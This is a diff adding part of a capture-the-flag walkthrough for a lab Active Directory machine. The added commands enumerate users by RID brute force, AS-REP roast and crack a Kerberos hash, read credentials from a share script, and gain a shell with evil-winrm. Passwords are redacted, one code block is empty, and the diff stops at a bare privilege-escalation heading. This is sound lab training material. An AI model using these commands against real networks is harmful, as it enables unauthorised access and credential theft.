@@ -108,4 +108,65 @@ Time to find a way to enumerate usernames on the box. i will be using rid-brute 
 ```
 crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser
 ```
+Since this is anonymous login, you can replace username robot with whatever you like. I used robot because i amm one -:)
+
 ![image](https://user-images.githubusercontent.com/68066436/118685539-3038aa80-b7d1-11eb-91e9-572fcd48794a.png)
+
+Extract the usernames with rid greater than 1000 into a username file. I named mine users.txt with below content
+
+```
+enterprise-core-vn
+a-whitehat
+t-skid
+j-goldenhand
+j-leet
+```
+kerberoasting with the username file returns a hash for t-skid
+
+```
+python3 GetNPUsers.py -dc-ip 10.10.176.144 -usersfile users.txt vulnnet-rst.local/
+```
+![image](https://user-images.githubusercontent.com/68066436/118688670-41cf8180-b7d4-11eb-9917-96222176f67f.png)
+
+Put whole hash (from $krb to end of hash) in a file and crack with john-the-ripper
+```
+john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting-hash
+```
+![image](https://user-images.githubusercontent.com/68066436/118689287-d1753000-b7d4-11eb-8b7f-869cfe676122.png)
+
+Creds for t-skid
+```
+user: t-skid
+pass: <redacted>
+```
+
+Try to access smb again with new creds to see if we get more access to some shares
+```
+smbmap -H vulnet.thm -u t-skid -p '<redacted>'
+```
+![image](https://user-images.githubusercontent.com/68066436/118689875-77c13580-b7d5-11eb-88a7-c99bc26d771f.png)
+Notice t-skid has read access to NETLOGON and SYSVOL shares which we did have with the anonymous logins
+
+Let's access NETLOGON share with smbclient and see what we've got in there
+```
+
+```
+![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)
+
+We get a new username and password after downloading and reading the content of ResetPassword.vbs
+![image](https://user-images.githubusercontent.com/68066436/118691117-bf948c80-b7d6-11eb-9360-202d1f66c064.png)
+
+Creds for a-whitehat
+```
+user: a-whitehat
+pass: <redacted>
+```
+
+Pass a-whitehat's creds into evil-winrm to get the initial foothold into the machine
+```
+evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
+```
+![image](https://user-images.githubusercontent.com/68066436/118691845-78f36200-b7d7-11eb-9909-907830b69594.png)
+
+
+## Privilege Escalation
